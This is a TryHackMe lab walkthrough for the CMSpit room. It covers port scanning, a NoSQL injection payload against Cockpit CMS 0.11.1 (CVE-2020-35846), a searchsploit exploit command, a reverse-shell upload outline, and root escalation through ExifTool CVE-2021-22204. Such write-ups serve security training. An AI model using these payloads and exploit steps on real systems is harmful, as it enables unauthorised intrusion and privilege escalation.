# CMSpit - TryHackMe Walkthrough


## 📋 Table of Contents
- [Initial Reconnaissance](#-initial-reconnaissance)
- [Web Enumeration](#-web-enumeration)
- [CMS Exploitation](#-cms-exploitation)
- [Privilege Escalation](#-privilege-escalation)
- [Flags](#-flags)

## 🔍 Initial Reconnaissance

### Port Scanning
Running an initial Nmap scan to identify open ports and services:

```bash
nmap -A 10.10.116.219
```

**Key Findings:**
- Port 22 (SSH): OpenSSH 7.2p2 Ubuntu
- Port 80 (HTTP): Apache httpd 2.4.18
  - Login page redirects to `/auth/login`
  - Server running Ubuntu Linux

<details>
<summary>View Full Nmap Output</summary>

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 11:10 +06
Nmap scan report for 10.10.116.219
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
```
</details>

## 🌐 Web Enumeration

### CMS Identification
- **Name**: Cockpit CMS
- **Version**: 0.11.1 (found in page source)
- **Vulnerable Endpoint**: `/auth/check` (NoSQL Injection - CVE-2020-35846)

### Key Paths & Endpoints
| Path | Purpose | Vulnerability |
|------|----------|--------------|
| `/auth/check` | User enumeration | NoSQL Injection |
| `/auth/requestreset` | Password reset | Unauthorized access |

## 💀 CMS Exploitation

### Method 1: Automated Exploit
1. Locate the exploit:
```bash
searchsploit cockpit 0.11.1
searchsploit -m 50185
```

2. Execute:
```bash
python3 50185.py -u http://TARGET_IP/
```

### Method 2: Manual Exploitation
Using Burp Suite, craft a NoSQL injection payload:
```json
{
  "auth": {
    "user": {
      "$func": "var_dump"
    },
    "password": "admin"
  },
  "csfr": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
}
```

### Shell Access
1. Upload PHP reverse shell to Assets
2. Configure shell with attacker IP/port
3. Start netcat listener
4. Access shell via direct asset link

## 🚀 Privilege Escalation

### User → Root
The system is vulnerable to **CVE-2021-22204** - ExifTool arbitrary code execution.

#### Requirements
- Tool: `djvumake`
- Dependencies: `djvulibre-bin`, `exiftool`

#### Exploitation Steps
1. Install dependencies:
```bash
sudo apt install djvulibre-bin exiftool
```

2. Generate malicious image:
```bash
python3 exploit-CVE-2021-22204.py -c "/bin/bash"
```

3. Transfer and execute:
   - Host Python server with malicious image
   - Download on target using `wget`
   - Execute with ExifTool for root shell

## 🏁 Flags

<details>
<summary>🚩 Web Flag</summary>
Location: <code>/var/www/html/cockpit</code><br>
Flag: <code>thm{REDACTED}</code>
</details>

<details>
<summary>🚩 Database Flag</summary>
Location: <code>dbshell</code> file<br>
Flag: <code>thm{REDACTED}</code>
</details>

<details>
<summary>🚩 User Flag</summary>
Location: <code>stux</code> home directory<br>
Flag: <code>thm{REDACTED}</code>
</details>

<details>
<summary>🚩 Root Flag</summary>
Location: <code>/root/root.txt</code><br>
Flag: <code>thm{REDACTED}</code>
</details>

## 📚 Additional Information
- **CVE Details**: CVE-2021-22204 - ExifTool Arbitrary Code Execution
- **Compromised Email**: skidy@tryhackme.fakemail
- **Database**: NoSQL document database

## 🛠️ Tools Used
- Nmap
- Burp Suite
- ExifTool
- djvumake
- Python exploit scripts

---
